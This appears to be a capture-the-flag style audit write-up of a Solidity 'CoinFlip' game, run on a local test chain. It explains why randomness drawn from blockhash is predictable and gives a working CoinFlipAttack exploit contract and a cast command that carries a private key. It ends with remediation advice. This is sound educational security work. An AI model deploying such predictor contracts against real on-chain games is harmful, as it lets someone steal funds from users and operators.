## Smart Contract Security Audit: Level 03 - CoinFlip

## Executive Summary
The target contract `CoinFlip` runs a game requiring users to predict a pseudo-random coin flip outcome to build a consecutive win streak. The contract was audited to evaluate its entropy generation method. The implementation was found to be completely deterministic, allowing an attacking contract to predict outcomes with 100% precision.

---

## Vulnerability Analysis
### Insecure Pseudo-Randomness via Predictable On-Chain Data
The contract attempts to generate randomness dynamically by querying environmental block metrics:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;

## The Structural Flaw

    Public Storage Data: All data inputs used to calculate the coin flip result (block.number and blockhash) are transparently readable from the public ledger state.

    Atomic Transaction Context: When an attacking smart contract invokes the target contract via an external call, both transactions execute inside the exact same block. Consequently, block.number - 1 evaluates identically for both entities simultaneously.

An attacker can deploy a contract that duplicates this exact mathematical logic, pre-computes the correct choice, and passes the winning answer to the victim in a single, atomic runtime execution phase.

## Exploitation Proof of Concept (PoC)

An exploit contract (CoinFlipAttack.sol) was compiled and deployed to replicate the calculation matrix before calling the target's flip function:
Solidity

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address _victim) public returns (bool) {
        CoinFlip coinflip = CoinFlip(_victim);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        coinflip.flip(side);
        return side;
    }
}

The attack function was executed across sequential blocks using the player private key:
Bash

cast send 0x610178dA211FEF7D417bC0e6FeD39F05609AD788 "attack(address)" 0x8A791620dd6260079BF849Dc5567aDC3F2FdC318 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

Result: The consecutiveWins storage variable successfully bypassed the design parameter, achieving an unblemished streak of 13 wins. 

## Remediation & Best Practices

    Cryptographic Off-Chain Oracles: Avoid relying on block variables for application entropy. Utilize industry-standard solutions such as Chainlink VRF (Verifiable Random Function), which delivers cryptographically secure, tamper-proof randomness proven off-chain and verified on-chain.

    Two-Phase Commit-Reveal Architecture: For workflows where oracles are impractical, implement a commit-reveal design pattern. Users submit a hidden hash of their choice in block N, and are only permitted to reveal the payload to resolve the logic in block N+X, breaking transaction atomicity.
